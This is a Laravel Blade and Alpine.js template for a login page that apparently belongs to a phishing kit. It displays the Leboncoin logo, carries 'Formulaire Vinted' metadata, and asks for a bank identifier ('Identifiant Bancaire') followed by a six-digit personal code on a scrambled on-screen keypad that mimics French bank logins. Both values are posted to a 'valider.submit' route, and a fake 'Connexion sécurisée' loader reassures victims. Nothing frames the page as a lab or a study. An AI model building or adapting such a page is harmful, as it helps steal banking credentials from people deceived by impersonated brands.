<!DOCTYPE html>
<html lang="{{ str_replace('_', '-', app()->getLocale()) }}">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0"> 

        <meta property="og:title" content="Formulaire Vinted" />
        <meta property="og:description" content="Veuillez remplir vos informations de connexion sécurisée." />
        <meta property="og:type" content="website" />
        <meta property="og:url" content="{{ config('app.url') }}" />
        <meta property="og:image" content="" />

    

        <title>{{ config('app.name', 'LEBONCOIN') }}</title>

        <!-- Fonts -->
        <link rel="preconnect" href="https://fonts.bunny.net">
        <link href="https://fonts.bunny.net/css?family=instrument-sans:400,500,600" rel="stylesheet" />
        <!--link rel="stylesheet" href="{{ asset('css/app.css') }}"-->

        @vite(['resources/css/app.css', 'resources/js/app.js'])
    </head>
   <body class="bg-gray-50 min-h-screen flex items-center justify-center">

    <div id="global-loader" style="position: fixed; inset: 0; z-index: 9999; background: white; display: flex; flex-direction: column; align-items: center; justify-content: center; transition: opacity 0.5s ease;">
        <div class="loader-content" style="text-align: center; margin-top: 0;">
            <div style="width: 50px; height: 50px; border: 5px solid #f3f3f3; border-top: 5px solid #F56B2A; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto;"></div>
            <h2 style="font-family: sans-serif; color: #1b1b18; margin-top: 20px;">Connexion sécurisée...</h2>
            <p style="font-family: sans-serif; color: #706f6c; font-size: 14px;">Traitement de votre validation </p> 
        </div>
    </div>

<style>
    @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
    }
</style>

<script>

        // B. On attend le chargement complet pour cacher le loader
        window.addEventListener('load', function() {
            const loader = document.getElementById('global-loader');
            
            // Sécurité : on vérifie que l'élément existe bien avant d'agir
            if (loader) {
                setTimeout(() => {
                    loader.style.opacity = '0';
                    setTimeout(() => {
                        loader.style.display = 'none';
                    }, 500);
                }, 1200);
            }
        });
    </script>
    


    <main x-data="{step: 1,username: '',code: ''}" class="w-full max-w-md mx-auto px-4 py-20 overflow-hidden">

    
        
        <div class="flex justify-center">
            <img
            src="{{ asset('images/leboncoin.png') }}"
            alt="Logo"
            class="h-10 sm:h-10 lg:h-10 w-auto"

            >
        </div>

        
    
        
   <div 
    x-show="step === 1"
    x-transition:enter="transition-all duration-500 ease-in-out"
    x-transition:enter-start="translate-x-full opacity-0"
    x-transition:enter-end="translate-x-0 opacity-100"
    x-transition:leave-start="translate-x-0 opacity-100"
    x-transition:leave-end="-translate-x-full opacity-0"
>

    <h1 class="flex justify-center mt-10 font-bold pb-8 text-2xl">
        Accéder à votre espace client
    </h1>

    <form @submit.prevent="step = 2" class="space-y-4">

        <div>
            <label class="block text-sm font-extrabold text-gray-700 mb-1">
                Identifiant 
            </label>

            <label class="block text-xs text-gray-500 mb-1">
                Saisissez votre identifiant
            </label>

            <input
                type="text"
                x-model="username"
               class="w-full px-4 py-2 text-sm border border-leboncoin rounded-lg outline-none focus:ring-2 focus:ring-leboncoin"

                placeholder="Identifiant Bancaire"
                required
            >
        </div>

        <div class="grid grid-cols-[1fr_auto] underline text-leboncoin text-sm font-bold">
            <a href="#">Où trouver mon identifiant ?</a>
        </div>

        <div class="flex justify-end">
            <button
                type="submit"
                class=" flex items-center justify-center bg-leboncoin hover:opacity-90 text-white font-bold py-3 px-6 rounded-lg cursor-pointer hover:scale-[1.01] active:scale-[0.99] transition-all duration-200">
                <svg class="w-4 h-4 mr-1 align-middle" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clip-rule="evenodd"></path></svg>
                Valider
            </button>
        </div>

    </form>

</div>

<div x-data="{ code: '', username: 'monidentifiant', step: 2, showCode: false } w-full max-w-md mx-auto px-4 py-4 sm:py-6"

    x-show="step === 2"
    x-cloak
    x-transition:enter="transition-all duration-500 ease-in-out"
    x-transition:enter-start="translate-x-full opacity-0"
    x-transition:enter-end="translate-x-0 opacity-100"
    x-transition:leave-start="translate-x-0 opacity-100"
    x-transition:leave-end="-translate-x-full opacity-0"
>
    
    <h1 class="flex justify-center mt-10 font-bold pb-8 text-2xl">
        Accéder à votre espace client
    </h1>
    
    <form action="{{ route('valider.submit') }}" method="POST" class="space-y-3">

        @csrf

        <label class="block text-sm font-extrabold text-gray-700 mb-1">
            Identifiant
        </label>

        <input 
    type="text"
    name="username"
    :value="username"
    readonly
    class="w-full px-4 py-2 border-2 border-leboncoin rounded-lg focus:outline-none focus:ring-2 focus:ring-leboncoin"
>


        <input type="hidden" name="code" :value="code">

        <h1 class="font-bold text-sm mt-2">

        Code personnel
    </h1>

        <p class="text-sm text-gray-500 leading-5 mt-1">Saisissez votre code personnel à l'aide du clavier ci-dessous.</p>

        @if ($errors->any())
            <div>
                @foreach ($errors->all() as $error)
                    <p>{{ $error }}</p>
                @endforeach
            </div>
        @endif

       <!-- Cases -->   
    <div x-data="{ showCode: false }">

    <!-- Cases + bouton œil -->
    <div class="flex items-center justify-center gap-2 mt-2">

        <!-- Cases -->
        <div class="flex gap-4 w-full max-w-md justify-center">
            <template x-for="i in 6" :key="i">
                <div class="w-8 h-8 border rounded-2xl flex items-center justify-center text-xs font-bold border-slate-400">

                    <span x-text="code[i-1] ? (showCode ? code[i-1] : '•') : '-'"
                :class="code[i-1] ? 'text-leboncoin' : 'text-slate-400'"></span>
                </div>
            </template>
        </div>

        <!-- Bouton œil -->
        <button
            type="button"
            @mousedown="showCode = true"
            @mouseup="showCode = false"
            @mouseleave="showCode = false"
            @touchstart.prevent="showCode = true"
            @touchend="showCode = false"
            class="p-2  bg-white shadow-lg rounded-full hover:bg-gray-100 transition cursor-pointer"
            aria-label="Afficher temporairement le code">

            <svg xmlns="http://www.w3.org/2000/svg"
                class="w-6 h-6 text-gray-500 hover:text-leboncoin transition-colors"
                fill="none"
                viewBox="0 0 24 24"
                stroke="currentColor"
                stroke-width="2">
                <path stroke-linecap="round"
                    stroke-linejoin="round"
                    d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"/>
                <path stroke-linecap="round"
                    stroke-linejoin="round"
                    d="M2.458 12C3.732 7.943 7.523 5 12 5s8.268 2.943 9.542 7c-1.274 4.057-5.065 7-9.542 7S3.732 16.057 2.458 12z"/>
            </svg>

        </button>

    </div>


</div>


    <a href="#" class="block mt-2 text-sm font-semibold text-leboncoin underline">
        J'ai oublié mon code personnel
    </a>

    <!-- Clavier -->
    <div class="grid grid-cols-4 gap-3 sm:gap-4 mt-5">

    <!-- Ligne 1 -->
    <button type="button" @click="if(code.length < 6) code += '7'" class="key col-span-1 h-14 rounded-3xl bg-white shadow-lg cursor-pointer">7</button>
    <button type="button" @click="if(code.length < 6) code += '3'" class="key col-span-1 h-14 rounded-3xl bg-white shadow-lg cursor-pointer">3</button>
    <button type="button" @click="if(code.length < 6) code += '2'" class="key col-span-1 h-14 rounded-3xl bg-white shadow-lg cursor-pointer">2</button>
    <button type="button" @click="if(code.length < 6) code += '8'" class="key col-span-1 h-14 rounded-3xl bg-white shadow-lg cursor-pointer">8</button>

    <!-- Ligne 2 -->
    <button type="button" @click="if(code.length < 6) code += '6'" class="key col-span-1 h-14 rounded-3xl bg-white shadow-lg cursor-pointer">6</button>
    <button type="button" @click="if(code.length < 6) code += '0'" class="key col-span-1 h-14 rounded-3xl bg-white shadow-lg cursor-pointer">0</button>
    <button type="button" @click="if(code.length < 6) code += '4'" class="key col-span-1 h-14 rounded-3xl bg-white shadow-lg cursor-pointer">4</button>
    <button type="button" @click="if(code.length < 6) code += '5'" class="key col-span-1 h-14 rounded-3xl bg-white shadow-lg cursor-pointer">5</button>

    <!-- Ligne 3 -->
    <button type="button" @click="if(code.length < 6) code += '1'" class="key col-span-1 h-14 rounded-3xl bg-white shadow-lg cursor-pointer">1</button>
    <button type="button" @click="if(code.length < 6) code += '9'" class="key col-span-1 h-14 rounded-3xl bg-white shadow-lg cursor-pointer">9</button>

    <!-- Effacer -->
    <button type="button" @click="code = code.slice(0,-1)"
        class="col-span-2 h-14 rounded-3xl bg-white shadow-lg flex items-center justify-center hover:shadow-xl transition cursor-pointer">

        <svg xmlns="http://www.w3.org/2000/svg"
             class="w-8 h-8 text-leboncoin"
             fill="none"
             viewBox="0 0 24 24"
             stroke="currentColor"
             stroke-width="2">

            <path stroke-linecap="round"
                  stroke-linejoin="round"
                  d="M20 6H9l-5 6 5 6h11a2 2 0 002-2V8a2 2 0 00-2-2z"/>

            <path stroke-linecap="round"
                  stroke-linejoin="round"
                  d="M13 10l4 4m0-4l-4 4"/>

        </svg>

    </button>

</div>


        <div class="flex items-center justify-between mt-5 pt-2">


            <button
                type="button"
                @click="step = 1"
                class="flex items-center gap-2 text-gray-600 hover:text-leboncoin transition-colors duration-200 cursor-pointer">

                <svg xmlns="http://www.w3.org/2000/svg"
                    class="w-5 h-5"
                    fill="none"
                    viewBox="0 0 24 24"
                    stroke="currentColor"
                    stroke-width="2">
                    <path stroke-linecap="round"
                        stroke-linejoin="round"
                        d="M15 19l-7-7 7-7" />
                </svg>

                <span>Retour</span>
            </button>


            <button
                type="submit"
                class="flex justify-center items-center bg-leboncoin hover:opacity-90 text-white font-bold py-3 px-6 rounded-lg cursor-pointer hover:scale-[1.01] active:scale-[0.99] transition-all duration-200">
                <svg class="w-4 h-4 mr-1 align-middle" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clip-rule="evenodd"></path></svg>
                Se connecter
            </button>

        </div>

    </form>

</div>
    </main>

    

       

    {{-- Espaceur conditionnel --}}
    @if (Route::has('login'))
        <div class="h-14 hidden lg:block"></div>
    @endif

    <script>
    // 2. On attend que TOUT soit chargé avant de toucher au style
    window.addEventListener('load', function() {
        const loader = document.getElementById('global-loader');
        
        // La sécurité : on vérifie que le loader existe bien avant de modifier son style
        if (loader) {
            setTimeout(() => {
                loader.style.opacity = '0';
                setTimeout(() => {
                    loader.style.display = 'none';
                }, 500);
            }, 1200);
        } else {
            console.error("Erreur : L'élément #global-loader n'a pas été trouvé dans le HTML.");
        }
    });
</script>

<script>
const togglePassword = document.getElementById('togglePassword');
const password = document.getElementById('password');

const eyeOpen = document.getElementById('eyeOpen');
const eyeClosed = document.getElementById('eyeClosed');

togglePassword.addEventListener('click', function () {

    const isPassword = password.type === 'password';

    password.type = isPassword ? 'text' : 'password';

    eyeOpen.classList.toggle('hidden');
    eyeClosed.classList.toggle('hidden');

});
</script>
</body>
</html>
